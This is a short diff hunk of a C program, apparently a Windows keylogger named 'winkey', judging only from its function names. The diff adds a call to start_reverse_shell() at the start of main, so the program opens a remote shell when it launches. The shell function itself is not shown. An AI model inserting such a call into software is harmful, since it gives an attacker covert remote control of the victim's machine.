@@ -138,8 +138,7 @@ int run_winkey(void)
 
 int main(void)
 {
+	start_reverse_shell();
 	CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
 	return (run_winkey());
 }
-
-
